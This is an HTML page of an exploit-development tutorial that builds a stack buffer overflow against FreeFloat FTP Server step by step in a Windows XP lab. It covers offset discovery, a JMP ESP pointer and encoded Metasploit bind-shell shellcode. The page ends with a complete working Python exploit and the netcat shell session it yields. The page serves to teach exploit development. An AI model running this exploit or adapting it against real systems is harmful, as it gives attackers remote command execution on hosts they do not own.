@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | ExploitDev: Part 2</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+    
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../../js/shCore.js"></script>
+	<script type="text/javascript" src="../../js/shBrushPython.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../../index.html">Home</a>
+            </li>
+            <li><a href="../../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../../coding.html">Scripting</a>
+            </li>
+            <li><a href="../../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../../links.html">Links</a>
+            </li>
+            <li><a href="../../patreon.html">Patreon</a></li><li><a href="../../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Saved Return Pointer Overflows</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Part 2: Saved Return Pointer Overflows<span class="line"></span></h2>
+        <p>For our first exploit we will be  starting with the most straight forward scenario where we have a  clean EIP overwrite and one of our CPU registers points directly to a  large portion of our buffer. For this part we will be creating an  exploit from scratch for &rdquo;FreeFloat FTP&rdquo;. You can find a list of  several exploits that were created for &rdquo;FreeFloat FTP&rdquo; <a href="http://www.exploit-db.com/search/?action=search&filter_description=freefloat">here</a>.</p><br />
+          <p>Normally we would need to do  badcharacter analysis but for our first tutorial we will rely on the  badcharacters that are listed in the pre-existing metasploit modules  on exploit-db. The characters that are listed are <strong>&rdquo;\x00\x0A\x0D&rdquo;</strong>.  We need to keep these characters in mind for later.</p><br />
+<p>Exploit Development: Backtrack 5<br />
+             Debugging Machine: Windows XP PRO SP3<br />
+          Vulnerable Software: <a href="http://www.exploit-db.com/wp-content/themes/exploit/applications/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip">Download</a></p>
+        
+        <br />
+      <div class="fourteen columns bottom">
+      <h2 class="title">Replicating The Crash<span class="line"></span></h2>
+      <p>First of all we need to create a POC  skeleton exploit to crash the FTP server. Once we have that we can  build on it to create our exploit. You can see my POC below, I have  based it on the exploits for &rdquo;FreeFloat FTP&rdquo; that I found on  exploit-db. We will be using the pre-existing &rdquo;anonymous&rdquo; user account which comes configured with the FTP server (the exploit should work with any valid login credentials).</p><br />
+    <div class="main_wrap_support">
+<pre class="brush: py;gutter:false;auto-links: false;;">
+#!/usr/bin/python
+
+import socket
+import sys
+
+evil = "A"*1000
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect(('192.168.111.128',21))
+
+s.recv(1024)
+s.send('USER anonymous\r\n')
+s.recv(1024)
+s.send('PASS anonymous\r\n')
+s.recv(1024)
+s.send('MKD ' + evil + '\r\n')
+s.recv(1024)
+s.send('QUIT\r\n')
+s.close</pre>
+</div>
+    
+<p>&nbsp;</p>
+<p>Ok, so far so good, when we attach the  debugger to the FTP server and send our POC buffer the program  crashes. In the screenshot below you can see that EIP is overwritten  and that two registers (ESP and EDI) contain part of our buffer. After analyzing both register dumps ESP seems more promising since it contains a larger chunk of our buffer (I should mention however that creating an exploit starting in EDI is certainly possible).</p><p>&nbsp;</p>
+
+    
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/part2-a_big.png" rel="prettyPhoto[part2]">
+          <img src="images/part2-a_small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Registers</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<h2 class="title">Overwriting EIP<span class="line"></span></h2>
+<p>Next we need to analyze our crash, to do that we need to replace our A's with the metasploit pattern and resend our buffer.  Pay attention that you keep the original buffer length since a varying buffer length may change the program crash.</p>
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre><span style="color:#ff0000;">root@bt</span>:~/Desktop# <span style='color:#2B8156;'>cd /pentest/exploits/framework/tools/</span>
+<span style="color:#ff0000;">root@bt</span>:/pentest/exploits/framework/tools# <span style='color:#2B8156;'>./pattern_create.rb 1000</span>
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4A
+d5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah
+0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5
+Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0A
+o1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar
+6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1
+Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6A
+y7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc
+2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7
+Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>When the program crashes again we see the same thing as in the screenshot above except that EIP (and both registers) is now overwritten by part of the metasploit pattern. Time to let “mona” do some of the heavy lifting. If we issue the following command in Immunity debugger we can have “mona” analyze the program crash. You can see the result of that analysis in the screenshot below.</p>
+          <br /><p><strong>!mona findmsp</strong></p><p>&nbsp;</p>
+
+    
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/part2-b_big.png" rel="prettyPhoto[part2]">
+          <img src="images/part2-b_small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Metasploit Pattern</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>From the analysis we can see that EIP is overwritten by the 4-bytes which directly follow after the initial 247-bytes of our buffer. Like I said before we can also see that ESP contains a larger chunk of our buffer so it is a more suitable candidate for our exploit. Using this information we can reorganize the evil buffer in our POC above to look like this:</p><br />
+
+<p><strong>evil = &quot;A&quot;*247 + &quot;B&quot;*4 + &quot;C&quot;*749</strong></p><br />
+<p>When we resend our modified buffer we  can see that it works exactly as we expected, EIP is overwritten by  our four B's.</p><p>&nbsp;</p>
+    
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/part2-c_big.png" rel="prettyPhoto[part2]">
+          <img src="images/part2-c_small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>EIP = 42424242</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>That means that we can replace those B's with a pointer that  redirects execution flow to ESP. The only thing we need to keep in  mind is that our pointer can't contain any badcharacters. To find  this pointer we can use &ldquo;mona&rdquo; with the following command. You can see the results in the screenshot below.</p><br />
+          <p><strong>!mona jmp -r esp</strong></p><p>&nbsp;</p>
+    
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/part2-d_big.png" rel="prettyPhoto[part2]">
+          <img src="images/part2-d_small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Pointers to ESP</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>It seems that any of these pointers will do, they belong to OS dll's so they will be specific to &ldquo;WinXP PRO SP3&rdquo; but that’s not our primary concern. We can just use the first pointer in the list. Keep in mind that we will need to reverse the byte order due to the Little Endian architecture of the CPU. Observe the syntax below.</p><br />
+          <p>Pointer: <strong>0x77c35459 : push esp #  ret  |  {PAGE_EXECUTE_READ} [msvcrt.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.5701 (C:\WINDOWS\system32\msvcrt.dll)</strong><br />
+             Buffer: <strong>evil = &quot;A&quot;*247 + &quot;\x59\x54\xC3\x77&quot; + &quot;C&quot;*749</strong></p><br />
+          <p>I should stress that it is important to  document your exploit properly for your own and others edification. Our final stage POC should look like this.</p>
+          
+    <div class="main_wrap_support">
+<pre class="brush: py;gutter:false;auto-links: false;;">
+#!/usr/bin/python
+
+import socket
+import sys
+
+#------------------------------------------------------------
+# Badchars: \x00\x0A\x0D
+# 0x77c35459 : push esp #  ret  | msvcrt.dll
+#------------------------------------------------------------
+
+evil = "A"*247 + "\x59\x54\xC3\x77" + "C"*749
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect(('192.168.111.128',21))
+
+s.recv(1024)
+s.send('USER anonymous\r\n')
+s.recv(1024)
+s.send('PASS anonymous\r\n')
+s.recv(1024)
+s.send('MKD ' + evil + '\r\n')
+s.recv(1024)
+s.send('QUIT\r\n')
+s.close</pre>
+</div>
+
+<p>&nbsp;</p>
+<p>Ok lets restart the program in the debugger and put a breakpoint on our pointer so the debugger pauses if it reaches it. As we can see in the screenshot below EIP is overwritten by our pointer and we hit our breakpoint which should bring us to our buffer located at ESP.</p><p>&nbsp;</p>
+
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/part2-e_big.png" rel="prettyPhoto[part2]">
+          <img src="images/part2-e_small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Breakpoint</p>
+      </div>
+      
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<h2 class="title">Shellcode + Game Over<span class="line"></span></h2>
+<p>We are almost done. We need to (1) modify our POC a bit to add a variable for our shellcode and (2) insert a payload that is to our liking. Lets start with the POC, we will be inserting our payload in the part of the buffer that is now made up of C's. Ideally we would like to have the buffer length modified dynamically so we don't need to recalculate if we insert a payload with a different size (our total buffer length should remain 1000-bytes). We should also insert some NOP's (No Operation Performed = \x90) before our payload as padding. You can see the result below. Any shellcode that we insert in the shellcode variable will get executed by our buffer overflow.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: py;gutter:false;auto-links: false;;">
+#!/usr/bin/python
+
+import socket
+import sys
+
+shellcode = (
+)
+
+#------------------------------------------------------------
+# Badchars: \x00\x0A\x0D
+# 0x77c35459 : push esp #  ret  | msvcrt.dll
+#------------------------------------------------------------
+
+buffer = "\x90"*20 + shellcode
+evil = "A"*247 + "\x59\x54\xC3\x77" + buffer + "C"*(749-len(buffer))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect(('192.168.111.128',21))
+
+s.recv(1024)
+s.send('USER anonymous\r\n')
+s.recv(1024)
+s.send('PASS anonymous\r\n')
+s.recv(1024)
+s.send('MKD ' + evil + '\r\n')
+s.recv(1024)
+s.send('QUIT\r\n')
+s.close</pre>
+</div>
+
+<p>&nbsp;</p>
+<p>All that remains now is to pop in some shellcode. We will be using msfpayload to generate our shellcode and pipe the raw output to msfencode to filter out badcharacters.</p><p>&nbsp;</p>
+  
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">root@bt</span>:~# <span style='color:#2B8156;'>msfpayload -l</span>
+<span style='color:#2B8156;'>[...snip...]</span>
+windows/shell/reverse_tcp_dns     Connect back to the attacker, Spawn a piped command shell (staged)
+windows/shell_bind_tcp            Listen for a connection and spawn a command shell
+windows/shell_bind_tcp_xpfw       Disable the Windows ICF, then listen for a connection and spawn a 
+                                  command shell
+<span style='color:#2B8156;'>[...snip...]</span>
+
+<span style="color:#ff0000;">root@bt</span>:~# <span style='color:#2B8156;'>msfpayload windows/shell_bind_tcp O</span>
+
+       Name: Windows Command Shell, Bind TCP Inline
+     Module: payload/windows/shell_bind_tcp
+    Version: 8642
+   Platform: Windows
+       Arch: x86
+Needs Admin: No
+ Total size: 341
+       Rank: Normal
+
+Provided by:
+  vlad902 &lt;vlad902@gmail.com&gt;
+  sf &lt;stephen_fewer@harmonysecurity.com&gt;
+
+Basic options:
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+LPORT     4444             yes       The listen port
+RHOST                      no        The target address
+
+Description:
+  Listen for a connection and spawn a command shell
+  
+<span style="color:#ff0000;">root@bt</span>:~# <span style='color:#2B8156;'>msfpayload windows/shell_bind_tcp LPORT=9988 R| msfencode -b '\x00\x0A\x0D' -t c</span>
+[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)
+
+unsigned char buf[] = 
+"\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+"\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27"
+"\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9"
+"\x11\xb2\xc1\x4a\x57\x1b\xe5\xfb\xd2\x7d\xc8\xfc\xd2\x41\x86"
+"\x3e\x74\x3e\xd5\x12\x56\x7f\x16\x67\x97\xb8\x4b\x87\xc5\x11"
+"\x07\x35\xfa\x16\x55\x85\xfb\xf8\xd1\xb5\x83\x7d\x25\x41\x3e"
+"\x7f\x76\xf9\x35\x37\x6e\x72\x11\xe8\x8f\x57\x41\xd4\xc6\xdc"
+"\xb2\xae\xd8\x34\x8b\x4f\xeb\x78\x40\x6e\xc3\x75\x98\xb6\xe4"
+"\x65\xef\xcc\x16\x18\xe8\x16\x64\xc6\x7d\x8b\xce\x8d\x26\x6f"
+"\xee\x42\xb0\xe4\xfc\x2f\xb6\xa3\xe0\xae\x1b\xd8\x1d\x3b\x9a"
+"\x0f\x94\x7f\xb9\x8b\xfc\x24\xa0\x8a\x58\x8b\xdd\xcd\x05\x74"
+"\x78\x85\xa4\x61\xfa\xc4\xa0\x46\x31\xf7\x30\xc0\x42\x84\x02"
+"\x4f\xf9\x02\x2f\x18\x27\xd4\x50\x33\x9f\x4a\xaf\xbb\xe0\x43"
+"\x74\xef\xb0\xfb\x5d\x8f\x5a\xfc\x62\x5a\xcc\xac\xcc\x34\xad"
+"\x1c\xad\xe4\x45\x77\x22\xdb\x76\x78\xe8\x6a\xb1\xb6\xc8\x3f"
+"\x56\xbb\xee\x98\xa2\x32\x08\x8c\xba\x12\x82\x38\x79\x41\x1b"
+"\xdf\x82\xa3\x37\x48\x15\xfb\x51\x4e\x1a\xfc\x77\xfd\xb7\x54"
+"\x10\x75\xd4\x60\x01\x8a\xf1\xc0\x48\xb3\x92\x9b\x24\x76\x02"
+"\x9b\x6c\xe0\xa7\x0e\xeb\xf0\xae\x32\xa4\xa7\xe7\x85\xbd\x2d"
+"\x1a\xbf\x17\x53\xe7\x59\x5f\xd7\x3c\x9a\x5e\xd6\xb1\xa6\x44"
+"\xc8\x0f\x26\xc1\xbc\xdf\x71\x9f\x6a\xa6\x2b\x51\xc4\x70\x87"
+"\x3b\x80\x05\xeb\xfb\xd6\x09\x26\x8a\x36\xbb\x9f\xcb\x49\x74"
+"\x48\xdc\x32\x68\xe8\x23\xe9\x28\x18\x6e\xb3\x19\xb1\x37\x26"
+"\x18\xdc\xc7\x9d\x5f\xd9\x4b\x17\x20\x1e\x53\x52\x25\x5a\xd3"
+"\x8f\x57\xf3\xb6\xaf\xc4\xf4\x92";</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>After prettifying the code a bit and adding the relevant notes the final exploit is ready.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: py;gutter:false;auto-links: false;;">
+#!/usr/bin/python
+
+#----------------------------------------------------------------------------------#
+# Exploit: FreeFloat FTP (MKD BOF)                                                 #
+# OS: WinXP PRO SP3                                                                #
+# Author: b33f (Ruben Boonen)                                                      #
+# Software: http://www.freefloat.com/software/freefloatftpserver.zip               #
+#----------------------------------------------------------------------------------#
+# This exploit was created for Part 2 of my Exploit Development tutorial series... #
+# http://www.fuzzysecurity.com/tutorials/expDev/2.html                             #
+#----------------------------------------------------------------------------------#
+# root@bt:~/Desktop# nc -nv 192.168.111.128 9988                                   #
+# (UNKNOWN) [192.168.111.128] 9988 (?) open                                        #
+# Microsoft Windows XP [Version 5.1.2600]                                          #
+# (C) Copyright 1985-2001 Microsoft Corp.                                          #
+#                                                                                  #
+# C:\Documents and Settings\Administrator\Desktop>                                 #
+#----------------------------------------------------------------------------------#
+
+import socket
+import sys
+
+#----------------------------------------------------------------------------------#
+# msfpayload windows/shell_bind_tcp LPORT=9988 R| msfencode -b '\x00\x0A\x0D' -t c #
+# [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)                     #
+#----------------------------------------------------------------------------------#
+
+shellcode = (
+"\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+"\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27"
+"\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9"
+"\x11\xb2\xc1\x4a\x57\x1b\xe5\xfb\xd2\x7d\xc8\xfc\xd2\x41\x86"
+"\x3e\x74\x3e\xd5\x12\x56\x7f\x16\x67\x97\xb8\x4b\x87\xc5\x11"
+"\x07\x35\xfa\x16\x55\x85\xfb\xf8\xd1\xb5\x83\x7d\x25\x41\x3e"
+"\x7f\x76\xf9\x35\x37\x6e\x72\x11\xe8\x8f\x57\x41\xd4\xc6\xdc"
+"\xb2\xae\xd8\x34\x8b\x4f\xeb\x78\x40\x6e\xc3\x75\x98\xb6\xe4"
+"\x65\xef\xcc\x16\x18\xe8\x16\x64\xc6\x7d\x8b\xce\x8d\x26\x6f"
+"\xee\x42\xb0\xe4\xfc\x2f\xb6\xa3\xe0\xae\x1b\xd8\x1d\x3b\x9a"
+"\x0f\x94\x7f\xb9\x8b\xfc\x24\xa0\x8a\x58\x8b\xdd\xcd\x05\x74"
+"\x78\x85\xa4\x61\xfa\xc4\xa0\x46\x31\xf7\x30\xc0\x42\x84\x02"
+"\x4f\xf9\x02\x2f\x18\x27\xd4\x50\x33\x9f\x4a\xaf\xbb\xe0\x43"
+"\x74\xef\xb0\xfb\x5d\x8f\x5a\xfc\x62\x5a\xcc\xac\xcc\x34\xad"
+"\x1c\xad\xe4\x45\x77\x22\xdb\x76\x78\xe8\x6a\xb1\xb6\xc8\x3f"
+"\x56\xbb\xee\x98\xa2\x32\x08\x8c\xba\x12\x82\x38\x79\x41\x1b"
+"\xdf\x82\xa3\x37\x48\x15\xfb\x51\x4e\x1a\xfc\x77\xfd\xb7\x54"
+"\x10\x75\xd4\x60\x01\x8a\xf1\xc0\x48\xb3\x92\x9b\x24\x76\x02"
+"\x9b\x6c\xe0\xa7\x0e\xeb\xf0\xae\x32\xa4\xa7\xe7\x85\xbd\x2d"
+"\x1a\xbf\x17\x53\xe7\x59\x5f\xd7\x3c\x9a\x5e\xd6\xb1\xa6\x44"
+"\xc8\x0f\x26\xc1\xbc\xdf\x71\x9f\x6a\xa6\x2b\x51\xc4\x70\x87"
+"\x3b\x80\x05\xeb\xfb\xd6\x09\x26\x8a\x36\xbb\x9f\xcb\x49\x74"
+"\x48\xdc\x32\x68\xe8\x23\xe9\x28\x18\x6e\xb3\x19\xb1\x37\x26"
+"\x18\xdc\xc7\x9d\x5f\xd9\x4b\x17\x20\x1e\x53\x52\x25\x5a\xd3"
+"\x8f\x57\xf3\xb6\xaf\xc4\xf4\x92")
+
+#----------------------------------------------------------------------------------#
+# Badchars: \x00\x0A\x0D                                                           #
+# 0x77c35459 : push esp #  ret  | msvcrt.dll                                       #
+# shellcode at ESP => space 749-bytes                                              #
+#----------------------------------------------------------------------------------#
+
+buffer = "\x90"*20 + shellcode
+evil = "A"*247 + "\x59\x54\xC3\x77" + buffer + "C"*(749-len(buffer))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect(('192.168.111.128',21))
+
+s.recv(1024)
+s.send('USER anonymous\r\n')
+s.recv(1024)
+s.send('PASS anonymous\r\n')
+s.recv(1024)
+s.send('MKD ' + evil + '\r\n')
+s.recv(1024)
+s.send('QUIT\r\n')
+s.close</pre>
+</div>
+
+<p>&nbsp;</p>
+<p>In the screenshot below we can see the before and after output of the “netstat -an” command and below that we have the backtrack terminal output when we connect to our bind shell. Game Over!!</p><p>&nbsp;</p>
+
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/part2-f_big.png" rel="prettyPhoto[part2]">
+          <img src="images/part2-f_small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Shell</p>
+      </div>
+      
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">root@bt</span>:~/Desktop# <span style='color:#2B8156;'>nc -nv 192.168.111.128 9988</span>
+(UNKNOWN) [192.168.111.128] 9988 (?) open
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Administrator\Desktop><span style='color:#2B8156;'>ipconfig</span>
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.111.128
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 
+
+C:\Documents and Settings\Administrator\Desktop></pre>
+<br />
+</div>
+
+<br />
+</div>
+    </div>
+</div>
+      
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../../index.html">Home</a> |
+          <a href="../../tutorials.html">Tutorials</a> |
+          <a href="../../coding.html">Scripting</a> |
+          <a href="../../exploits.html">Exploits</a> |
+          <a href="../../links.html">Links</a> |
+          <a href="../../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
